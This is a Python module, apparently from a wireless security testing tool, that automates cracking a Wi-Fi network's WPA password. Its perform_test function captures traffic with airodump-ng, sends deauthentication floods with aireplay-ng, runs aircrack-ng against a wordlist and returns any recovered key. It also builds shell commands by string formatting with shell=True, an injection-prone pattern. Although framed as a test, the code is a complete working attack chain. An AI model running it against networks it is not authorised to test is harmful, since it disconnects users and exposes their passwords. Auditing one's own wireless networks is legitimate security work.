# https://www.aircrack-ng.org/documentation.html

import subprocess
from subprocess import TimeoutExpired
import psutil
import re
import glob
import logging
import logger
import scan
from tests.TestResult import TestResult

LOGGER = logging.getLogger(__name__)
logger.setup_logger(LOGGER)


def perform_test(device):
    """
    :param device: A tuple (mac, channel, ssid, password_file)
    :return: (TestResult, result) Password is returned only in case of TestResult.AIRCRACK_SUCCESS
    """

    file_path = "./tests/data/hack"
    #airodump = subprocess.Popen("airodump-ng --bssid %s -c %s -w %s wlan0" % (device[0], device[1], file_path + "/hackme"), shell=True,)#stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    airodump = subprocess.Popen("airodump-ng --bssid %s -c %s -w %s %s" % (device[0], device[1], file_path + "/hackme", scan.SETUP[5]), shell=True)

    std_err = ""
    try:
        _, std_err = airodump.communicate(timeout=0.5)
    except TimeoutExpired:
        pass

    if std_err != "" and std_err is not None:
        LOGGER.error(std_err)

    #aireplay = subprocess.Popen("aireplay-ng -0 4 -a %s wlan0" % (device[0],), shell=True)
    aireplay = subprocess.Popen("aireplay-ng -0 4 -a %s %s" % (device[0], scan.SETUP[5]), shell=True)
    _, std_err = aireplay.communicate()
    aireplay.kill()

    if std_err != "" and std_err is not None:
        LOGGER.error(std_err)

    caps = glob.glob(file_path+"/hackme-*.cap")
    max_num = 0
    last_cap_file = ''
    for cap in caps:
        result = re.search('([0-9]+)\\.cap', cap).group(1)
        num = int(result)
        if max_num < num:
            max_num = num
            last_cap_file = cap

    # aircrack = subprocess.Popen("aircrack-ng %s -w %s"
    #                             % (last_cap_file, device[3], ), shell=True)

    # aircrack = subprocess.Popen(["aircrack-ng", last_cap_file, "-w", device[3]], shell=True
    #                             , stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    # std_out, std_err = aircrack.communicate()

    # completed_process = subprocess.run("aircrack-ng %s -w %s" % (last_cap_file, device[3]), capture_output=False,
    #                                    shell=True)
    # std_out = completed_process.stdout
    # std_err = completed_process.stderr

    with open("aircrack.txt", "w") as out:
        completed_process = subprocess.run("aircrack-ng %s -w %s" % (last_cap_file, device[3]), stdout=out, shell=True)

    with open("aircrack.txt", "r") as out:
        std_out = out.read()

    # std_out = completed_process.stdout
    # std_err = completed_process.stderr

    print("STD_OUT:", completed_process)

    # if std_out is not None:
    #     std_out = std_out.decode()
    # if std_err is not None:
    #     std_err = std_err.decode()
    #close_processes(airodump)

    if std_out != "" and std_out is not None:
        match = re.search('KEY FOUND! \[ (.*) ]', std_out)
        if match is not None:
            password = match.group(1)
            close_processes(airodump)
            return TestResult.AIRCRACK_SUCCESS, password
        match = re.search('KEY NOT FOUND', std_out)
        if match is not None:
            close_processes(airodump)
            return TestResult.OK, ''

    description = ''
    if std_err != "" and std_err is not None:
        LOGGER.error(std_err)
        description = std_err
    elif std_out != "" and std_out is not None:
        description = std_out
        close_processes(airodump)
    return TestResult.AIRCRACK_NOT_PERFORMED, description


def close_processes(proc):
    try:
        parent = psutil.Process(proc.pid)
        for child in parent.children(recursive=True):  # or parent.children() for recursive=False
            child.kill()
        parent.kill()
    except Exception as e:
        LOGGER.warning(e)

